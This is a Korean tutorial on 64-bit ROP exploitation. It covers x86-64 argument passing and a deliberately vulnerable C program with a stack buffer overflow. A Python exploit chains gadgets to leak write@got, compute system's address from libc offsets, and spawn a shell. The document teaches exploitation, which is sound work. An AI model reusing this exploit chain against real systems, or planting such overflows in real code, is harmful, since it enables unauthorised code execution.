# 64bit ROP
* 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달한다.
* 예제1
``` C
// gcc -o call64 call64.c 
#include <stdio.h>
int main()
{
	printf("%d + %d = %d\n %d + %d = %d\n",1,2,3,4,5,9);
	return 0;
}
```
```
$ gdb call64
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400526 <+0>:	push   rbp
   0x0000000000400527 <+1>:	mov    rbp,rsp
   0x000000000040052a <+4>:	sub    rsp,0x8
   0x000000000040052e <+8>:	push   0x9
   0x0000000000400530 <+10>:	mov    r9d,0x5
   0x0000000000400536 <+16>:	mov    r8d,0x4
   0x000000000040053c <+22>:	mov    ecx,0x3
   0x0000000000400541 <+27>:	mov    edx,0x2
   0x0000000000400546 <+32>:	mov    esi,0x1
   0x000000000040054b <+37>:	mov    edi,0x4005f4
   0x0000000000400550 <+42>:	mov    eax,0x0
   0x0000000000400555 <+47>:	call   0x400400 <printf@plt>
(gdb) x/s 0x4005f4
0x4005f4:	"%d + %d = %d\n %d + %d = %d\n"
```
printf 함수 호출 이전에 인자를 각각 레지스터와 스택에 넣고 호출한다. 디스어셈블리 결과를 보면 64비트에서 함수가 호출될 때 전달되는 인자는 다음과 같다.   
![image](https://user-images.githubusercontent.com/59531805/79732081-26bee380-832e-11ea-8386-f2910251b517.png)
rdi, rsi, rdx, rcx, r9, r9 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장한다.
64비트 아키텍쳐에서는 pop과 같은 명령어를 통해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있다.
* 예제2
``` C
// gcc -o rop64 rop64.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>
void gadget() {
	asm("pop %rdi");
	asm("pop %rsi");
	asm("pop %rdx");
	asm("ret");
}
int main()
{
	char buf[256];
	write(1, "Data: ", 6);
	read(0, buf, 1024); 
	return 0;
}
```
``` python
# rop64.py
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\x20':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + "\n")
  except:
    raise
def p64(val):
  return struct.pack("<Q", val)
def u64(data):
  return struct.unpack("<Q", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
print `read(out_r, 6)`
# write(1, 0x601018, 8)
payload  = "A"*264         # buf padding
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x601018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x400430)   # write_plt 
# read(0, 0x601018, 16)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x601018)   # write@got
payload += p64(16)          # 8
payload += p64(0x400440)   # read@plt
# write(0x601020,0,0)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x601020)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x400430)   # write@plt
writeline(s, payload)
```
rop64.c에는 스택 버퍼 오버플로우 취약점이 존재한다.
익스플로잇의 편의를 위해 rdi, rsi, rdx 레지스터에 각각 원하는 값을 전달할 수 있는 ROP 코드 가젯을 제공했다.
공격 코드를 작성하기에 앞서 objdump를 사용하여 pop rdi; pop rsi; pop rdx; ret 코드 가젯의 주소를 알아내야 한다.
```
$ objdump -d rop64 | grep "gadget" -A6
0000000000400566 <gadget>:
  400566:	55                   	push   %rbp
  400567:	48 89 e5             	mov    %rsp,%rbp
  40056a:	5f                   	pop    %rdi
  40056b:	5e                   	pop    %rsi
  40056c:	5a                   	pop    %rdx
  40056d:	c3                   	retq
  ```
해당 코드 가젯은 0x40056a주소에 존재한다. 찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 write@got에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아낸다.
이후, 알아낸 라이브러리 주소를 통해 write@got를 system 함수로 덮어쓰고 "/bin/sh" 문자열을 입력한다.
최종적으로 write 함수를 호출하고 "/bin/sh" 문자열의 주소인 0x601020를 첫 번째 인자로 전달하면 셸을 획득할 수 있다.   
라이브러리의 베이스 주소와 system 함수 주소를 계산하기 위해 readelf를 사용하여 오프셋을 알아내야 한다.
```
$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "write"
  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
    99: 00000000000746c0   466 FUNC    GLOBAL DEFAULT   13 _IO_wdo_write@@GLIBC_2.2.5
   169: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 __write@@GLIBC_2.2.5
   287: 000000000007a390   269 FUNC    GLOBAL DEFAULT   13 _IO_do_write@@GLIBC_2.2.5
   491: 0000000000108040    36 FUNC    GLOBAL DEFAULT   13 process_vm_writev@@GLIBC_2.15
   493: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 __pwrite64@@GLIBC_2.2.5
   851: 00000000000fcfd0    90 FUNC    WEAK   DEFAULT   13 writev@@GLIBC_2.2.5
  1252: 00000000000f5ac0    96 FUNC    GLOBAL DEFAULT   13 __libc_pwrite@@GLIBC_PRIVATE
  1513: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev@@GLIBC_2.10
  1565: 0000000000107700    41 FUNC    GLOBAL DEFAULT   13 eventfd_write@@GLIBC_2.7
  1580: 000000000006e6e0   456 FUNC    WEAK   DEFAULT   13 fwrite@@GLIBC_2.2.5
  1855: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev64@@GLIBC_2.10
  2005: 0000000000078b70   171 FUNC    GLOBAL DEFAULT   13 _IO_file_write@@GLIBC_2.2.5
  2025: 000000000006e6e0   456 FUNC    GLOBAL DEFAULT   13 _IO_fwrite@@GLIBC_2.2.5
  2044: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite@@GLIBC_2.2.5
  2103: 00000000000781a0   106 FUNC    GLOBAL DEFAULT   13 fwrite_unlocked@@GLIBC_2.2.5
  2112: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite64@@GLIBC_2.2.5
  2159: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
   225: 0000000000138810    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
  ```
라이브러리의 write와 system 함수 오프셋은 각각 0xf72b0, 0x45390인 것을 알아냈다.   
출력된 write@got 값과 라이브러리의 write 함수 오프셋을 계산하여 라이브러리의 베이스 주소를 알아내고, system 함수 오프셋과 덧셈 연산을 하여 system 함수 주소를 알아냈다.
write@got에 입력받을 때 system 함수 주소와 "/bin/sh" 문자열을 입력하고, write 함수를 호출할 때 인자로 0x601020 주소를 전달하면 셸을 획득할 수 있다.
```
$ python ex.py
'Data: '
0x7f98a275c2b0
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```
